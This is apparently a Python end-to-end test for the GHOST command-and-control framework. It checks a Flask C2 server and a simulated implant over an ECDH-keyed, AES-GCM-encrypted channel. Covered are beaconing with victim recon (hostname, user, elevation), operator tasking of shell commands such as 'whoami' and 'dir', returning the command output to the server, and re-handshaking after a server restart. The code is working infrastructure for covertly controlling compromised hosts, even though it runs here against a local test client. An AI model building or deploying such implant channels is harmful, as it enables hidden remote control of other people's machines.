#!/usr/bin/env python3
"""
End-to-end test of the GHOST C2 channel protocol (ECDH P-256 handshake +
AES-256-GCM wire encryption) against the Flask server, using its test client.

The FakeImplant class mirrors the implant's SendBeacon/SendResult logic in
src/c2.cpp: encrypt only once a server public point ("spk") has been seen,
adopt spk on every response, decrypt "e":1 cmd blobs, fall back to plaintext
after a rejection and re-handshake.

Run:  python tests/test_protocol.py
"""
import base64
import hashlib
import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "server"))

import c2_server as srv  # noqa: E402
from cryptography.hazmat.primitives.asymmetric import ec  # noqa: E402
from cryptography.hazmat.primitives.ciphers.aead import AESGCM  # noqa: E402
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat  # noqa: E402

PASS = 0
FAIL = 0

def check(name, cond, detail=""):
    global PASS, FAIL
    if cond:
        PASS += 1
        print(f"  [ok] {name}")
    else:
        FAIL += 1
        print(f"  [FAIL] {name} {detail}")


class FakeImplant:
    """Mirrors src/c2.cpp channel logic (SendBeacon / SendResult)."""

    def __init__(self, sid):
        self.sid = sid
        self.priv = ec.generate_private_key(ec.SECP256R1())
        pub = self.priv.public_key().public_bytes(
            Encoding.X962, PublicFormat.UncompressedPoint)[1:]  # X||Y big-endian
        self.pub_b64 = base64.b64encode(pub).decode()
        self.srv_pub_b64 = None
        self.key = None
        self.c = srv.app.test_client()

    def _derive(self, srv_pub_b64):
        xy = base64.b64decode(srv_pub_b64)
        peer = ec.EllipticCurvePublicKey.from_encoded_point(ec.SECP256R1(), b"\x04" + xy)
        return hashlib.sha256(self.priv.exchange(ec.ECDH(), peer)).digest()

    def _headers(self, enc=False):
        h = {"X-Beacon-Token": srv._CFG["beacon_token"],
             "X-Pub-Key": self.pub_b64,
             "X-Session-ID": self.sid,
             "Content-Type": "application/json"}
        if enc and self.key:
            h["X-Enc"] = "1"
        return h

    def _consume(self, resp_body):
        """Adopt spk, then extract cmd — same order as the implant."""
        spk = resp_body.get("spk", "")
        if spk and spk != self.srv_pub_b64:
            key = self._derive(spk)
            if key:
                self.key = self.key if False else key  # adopt
                self.srv_pub_b64 = spk
        cmd = resp_body.get("cmd", "")
        if cmd and resp_body.get("e") == 1 and self.key:
            pt = AESGCM(self.key).decrypt(
                base64.b64decode(cmd)[:12],
                base64.b64decode(cmd)[28:] + base64.b64decode(cmd)[12:28],
                None)
            cmd = json.loads(pt)["cmd"]
        return cmd

    def beacon(self, task_pending=False, force_plaintext=False):
        body = {"session": self.sid,
                "recon": {"hostname": "LAB-VM", "user": "tester",
                          "build": 22631, "elevated": True}}
        data = srv._enc_blob(self.key, body) if (self.key and not force_plaintext) \
            else json.dumps(body)
        r = self.c.post("/beacon", data=data, headers=self._headers(enc=not force_plaintext))
        assert r.status_code == 200, f"beacon -> {r.status_code}: {r.get_data(as_text=True)}"
        return self._consume(r.get_json())

    def result(self, output):
        body = {"session": self.sid, "output": output}
        data = srv._enc_blob(self.key, body) if self.key else json.dumps(body)
        r = self.c.post("/result", data=data, headers=self._headers(enc=bool(self.key)))
        assert r.status_code == 200, f"result -> {r.status_code}"
        return r.get_json()

    def push_task(self, cmd):
        r = self.c.post("/task", json={"session": self.sid, "cmd": cmd},
                        headers={"X-Operator-Token": srv._CFG["operator_token"]})
        assert r.status_code == 200, f"task -> {r.status_code}"

    def results(self):
        r = self.c.get(f"/results/{self.sid}",
                       headers={"X-Operator-Token": srv._CFG["operator_token"]})
        assert r.status_code == 200
        return r.get_json()


def main():
    srv._CFG["auto_accept"] = True
    sid = "ab12cd34|tester"

    print("── handshake + encrypted round trip ──")
    imp = FakeImplant(sid)
    cmd = imp.beacon(force_plaintext=True)          # first beacon: bootstrap
    check("first beacon returns spk", bool(imp.srv_pub_b64))
    check("server stored channel key",
          srv._sessions[sid].get("key") == imp.key)
    check("first beacon cmd (encrypted) = sleep", cmd == "sleep", repr(cmd))

    imp.push_task('whoami && echo "quoted arg" ünïcode')
    cmd = imp.beacon()
    check("task delivered encrypted, quotes+unicode intact",
          cmd == 'whoami && echo "quoted arg" ünïcode', repr(cmd))

    out = 'done\nline "two" — ünïcode ✓'
    imp.result(out)
    got = imp.results()["results"][-1]["output"]
    check("result round trip (encrypted)", got == out, repr(got))

    print("── second beacon keeps channel ──")
    key_before = imp.key
    cmd = imp.beacon()
    check("key unchanged", imp.key == key_before)
    check("cmd = sleep", cmd == "sleep")

    print("── server restart (keypair rotated, in-memory store wiped) ──")
    srv._SRV_ECDH = ec.generate_private_key(ec.SECP256R1())
    srv._SRV_PUB_B64 = base64.b64encode(
        srv._SRV_ECDH.public_key().public_bytes(
            Encoding.X962, PublicFormat.UncompressedPoint)[1:]).decode()
    srv._sessions.clear()
    srv._tasks.clear()
    srv._results.clear()
    cmd = imp.beacon()   # implant still encrypted with the old key
    check("rehandshake response plaintext + new spk", cmd == "sleep")
    check("implant adopted new server pub", imp.srv_pub_b64 == srv._SRV_PUB_B64)

    cmd = imp.beacon()   # re-accepted? auto-accept is on → channel re-established
    check("beacon after re-handshake encrypted OK", cmd == "sleep")

    imp.push_task("dir")
    cmd = imp.beacon()
    check("task served after re-handshake", cmd == "dir", repr(cmd))
    check("server stored rotated key",
          srv._sessions[sid].get("key") == imp.key)

    print("── blob helpers round trip ──")
    blob = srv._enc_blob(imp.key, {"x": 'a"b\\c\nü'})
    check("enc/dec round trip", srv._dec_blob(imp.key, blob) == {"x": 'a"b\\c\nü'})

    print(f"\n{PASS} passed, {FAIL} failed")
    sys.exit(1 if FAIL else 0)


if __name__ == "__main__":
    main()
